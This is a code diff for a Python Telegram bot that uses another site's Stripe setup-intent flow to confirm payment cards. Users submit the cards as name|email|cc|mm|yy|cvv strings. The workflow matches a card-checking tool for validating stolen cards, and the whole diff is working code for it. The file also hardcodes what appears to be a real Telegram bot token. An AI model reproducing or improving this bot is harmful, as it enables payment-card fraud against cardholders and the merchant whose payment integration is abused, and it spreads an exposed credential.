@@ -11,7 +11,10 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 BOT_TOKEN = "8072279299:AAHAEodRhWpDb2g7EIVNFc3pk1Yg0YlpaPc"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Cinema Mastery Specific Information
+# Cinema Mastery Specific Information (HARDCODED - REPLACE WITH YOUR VALUES)
+PAGE_ID = "YOUR_PAGE_ID"
+STRIPE_PUBLISHABLE_KEY = "YOUR_STRIPE_PUBLISHABLE_KEY"
+STRIPE_ACCOUNT_ID = "YOUR_STRIPE_ACCOUNT_ID"
 CINEMAMASTERY_BASE_URL = "https://cinemamastery.com"
 STRIPE_API_URL = "https://api.stripe.com/v1"
 
@@ -89,6 +92,9 @@ def extract_setup_intent_id(client_secret):
 # --- Part 1 Ends Here ---
 # --- Part 2 Begins Here ---
 
+# Global variable to store the setup intent ID
+setup_intent_id = None
+
 def confirm_setup_intent(setup_intent_id, name, email, cc, mm, yy, cvv, guid):
     url = f"{STRIPE_API_URL}/setup_intents/{setup_intent_id}/confirm"
     headers = STRIPE_HEADERS.copy()
@@ -104,23 +110,16 @@ def confirm_setup_intent(setup_intent_id, name, email, cc, mm, yy, cvv, guid):
 # Telegram Bot Handlers
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "Welcome! Let's set up your payment for Cinema Mastery. Please provide the page ID, Stripe Publishable Key, and Stripe Account ID (separated by spaces):")
-
-@bot.message_handler(func=lambda message: len(message.text.split()) == 3)
-def get_api_keys(message):
-    global page_id, stripe_publishable_key, stripe_account_id
-    page_id, stripe_publishable_key, stripe_account_id = message.text.split()
-    bot.reply_to(message, "Creating setup intent...")
-    client_secret = create_setup_intent(page_id, stripe_publishable_key, stripe_account_id)
+    bot.reply_to(message, "Welcome! Please provide your name, email, and credit card details in the format: name|email|cc|mm|yy|cvv|guid")
+    # Immediately try to create the setup intent
+    global setup_intent_id
+    client_secret = create_setup_intent(PAGE_ID, STRIPE_PUBLISHABLE_KEY, STRIPE_ACCOUNT_ID)
     if client_secret:
-        global setup_intent_id
         setup_intent_id = extract_setup_intent_id(client_secret)
-        if setup_intent_id:
-            bot.reply_to(message, f"Setup Intent ID created: {setup_intent_id}. Please provide your name, email, and credit card details in the format: name|email|cc|mm|yy|cvv|guid")
-        else:
-            bot.reply_to(message, "Error: Could not extract Setup Intent ID.")
+        if not setup_intent_id:
+            bot.send_message(message.chat.id, "Error: Could not extract Setup Intent ID.")
     else:
-        bot.reply_to(message, "Error: Failed to create setup intent.")
+        bot.send_message(message.chat.id, "Error: Failed to create setup intent.")
 
 @bot.message_handler(func=lambda message: len(message.text.split('|')) == 7)
 def process_payment_info(message):
@@ -142,7 +141,7 @@ def process_payment_info(message):
             else:
                 bot.reply_to(message, "Failed to confirm setup intent.")
         else:
-            bot.reply_to(message, "Error: Setup Intent ID is not available.")
+            bot.reply_to(message, "Error: Setup Intent ID is not available. Did the bot fail to initialize?")
 
     except ValueError:
         bot.reply_to(message, "Invalid input format. Please use: name|email|cc|mm|yy|cvv|guid")
@@ -152,7 +151,7 @@ def process_payment_info(message):
 
 @bot.message_handler(func=lambda message: True)
 def echo_all(message):
-    bot.reply_to(message, "I can help you set up payment for Cinema Mastery. Send /start to begin.")
+    bot.reply_to(message, "Please send /start to begin the payment setup.")
 
 if __name__ == '__main__':
     logging.info("Bot started...")
